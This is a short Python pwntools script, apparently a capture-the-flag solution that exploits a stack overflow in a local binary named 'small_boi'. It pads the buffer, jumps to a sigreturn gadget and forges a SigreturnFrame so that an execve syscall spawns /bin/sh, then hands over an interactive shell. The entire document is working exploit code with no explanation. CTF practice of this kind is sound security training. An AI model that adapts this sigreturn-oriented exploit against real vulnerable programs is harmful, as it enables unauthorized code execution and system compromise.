from pwn import *

context.arch = 'amd64'

def exploit():
    p = process("./small_boi")
    sigreturn = 0x0000000000400180
    binsh_address = 0x4001ca
    syscall = 0x0000000000400185
    padding = 40
    frame = SigreturnFrame(kernel='amd64')
    frame.rip = syscall
    frame.rdi = binsh_address
    frame.rsi = 0
    frame.rdx = 0
    frame.rax = 59

    payload = ""
    payload += "A" * padding
    payload += p64(sigreturn)
    payload += str(frame)
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    exploit()